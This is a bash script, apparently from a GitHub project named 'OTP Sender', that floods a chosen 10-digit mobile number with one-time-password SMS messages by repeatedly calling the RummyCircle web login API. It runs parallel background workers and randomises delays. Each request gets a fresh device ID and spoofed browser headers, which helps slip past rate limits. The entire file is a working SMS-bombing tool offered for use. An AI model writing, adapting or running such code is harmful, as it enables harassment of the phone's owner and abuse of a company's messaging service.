#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Global variables
MOBILE=""
THREADS=1
MIN_DELAY=2
MAX_DELAY=5
STOP_FLAG=0
TOTAL_REQUESTS=0
SUCCESSFUL_REQUESTS=0
FAILED_REQUESTS=0
START_TIME=$(date +%s)
LOG_FILE="otp_sender_$(date +%Y%m%d_%H%M%S).log"

# Banner function
print_banner() {
    clear
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════╗"
    echo "║           OTP Sender                 ║"
    echo "║      github.com/BhasKar6999         ║"
    echo "╚══════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${YELLOW}Target Mobile:${NC} ${GREEN}$MOBILE${NC}"
    echo -e "${YELLOW}Start Time:${NC} ${GREEN}$(date)${NC}"
    echo ""
}

# Statistics function
print_stats() {
    local current_time=$(date +%s)
    local runtime=$((current_time - START_TIME))
    local hours=$((runtime / 3600))
    local minutes=$(( (runtime % 3600) / 60 ))
    local seconds=$((runtime % 60))
    local runtime_formatted=$(printf "%02d:%02d:%02d" $hours $minutes $seconds)
    
    local success_rate=0
    if [ $TOTAL_REQUESTS -gt 0 ]; then
        success_rate=$(awk "BEGIN {printf \"%.2f\", ($SUCCESSFUL_REQUESTS/$TOTAL_REQUESTS)*100}")
    fi

    echo -e "\n=== ${CYAN}Statistics${NC} ==="
    echo -e "Total Requests: ${CYAN}$TOTAL_REQUESTS${NC}"
    echo -e "Successful Requests: ${GREEN}$SUCCESSFUL_REQUESTS${NC}"
    echo -e "Failed Requests: ${RED}$FAILED_REQUESTS${NC}"
    echo -e "Success Rate: ${YELLOW}${success_rate}%${NC}"
    echo -e "Runtime: ${BLUE}$runtime_formatted${NC}"
    echo -e "\n${CYAN}Press Ctrl+C to stop...${NC}"
}

# Logger function
log_message() {
    local level=$1
    local message=$2
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "[$timestamp] [$level] $message" >> "$LOG_FILE"
    
    case $level in
        "INFO")
            echo -e "${GREEN}[$timestamp] [$level] $message${NC}"
            ;;
        "ERROR")
            echo -e "${RED}[$timestamp] [$level] $message${NC}"
            ;;
        *)
            echo -e "[$timestamp] [$level] $message"
            ;;
    esac
}

# Send OTP function
send_otp() {
    local device_id=$(uuidgen)
    local user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    
    local response=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -H "User-Agent: $user_agent" \
        -H "Accept: application/json" \
        -H "Origin: https://www.rummycircle.com" \
        -H "Referer: https://www.rummycircle.com/" \
        -H "x-source: web" \
        -H "x-platform: desktop" \
        -d "{\"mobile\":\"$MOBILE\",\"deviceId\":\"$device_id\",\"deviceName\":\"Windows PC\",\"refCode\":\"\",\"isPlaycircle\":false}" \
        "https://www.rummycircle.com/api/fl/auth/v3/getOtp")
    
    if [ $? -eq 0 ]; then
        ((TOTAL_REQUESTS++))
        ((SUCCESSFUL_REQUESTS++))
        log_message "INFO" "OTP sent successfully. Request #$TOTAL_REQUESTS"
        return 0
    else
        ((TOTAL_REQUESTS++))
        ((FAILED_REQUESTS++))
        log_message "ERROR" "Error sending OTP: Request failed"
        return 1
    fi
}

# Worker function
worker() {
    while [ $STOP_FLAG -eq 0 ]; do
        send_otp
        local delay=$(awk -v min=$MIN_DELAY -v max=$MAX_DELAY 'BEGIN{srand(); print min+rand()*(max-min)}')
        sleep $delay
    done
}

# Cleanup function
cleanup() {
    STOP_FLAG=1
    echo -e "\n${GREEN}Stopping OTP sender...${NC}"
    print_stats
    exit 0
}

# Main function
main() {
    # Parse arguments
    while [[ $# -gt 0 ]]; do
        case $1 in
            --mobile)
                MOBILE="$2"
                shift 2
                ;;
            --threads)
                THREADS="$2"
                shift 2
                ;;
            --min-delay)
                MIN_DELAY="$2"
                shift 2
                ;;
            --max-delay)
                MAX_DELAY="$2"
                shift 2
                ;;
            *)
                echo "Unknown parameter: $1"
                exit 1
                ;;
        esac
    done

    # Validate mobile number
    if [[ ! $MOBILE =~ ^[0-9]{10}$ ]]; then
        echo -e "${RED}Error: Please provide a valid 10-digit mobile number${NC}"
        exit 1
    fi

    # Set up trap for cleanup
    trap cleanup SIGINT SIGTERM

    # Print banner
    print_banner

    # Start workers
    for ((i=1; i<=THREADS; i++)); do
        worker &
    done

    # Print stats periodically
    while [ $STOP_FLAG -eq 0 ]; do
        print_stats
        sleep 5
    done

    # Wait for all background processes to finish
    wait
}

# Run main function with all arguments
main "$@" 
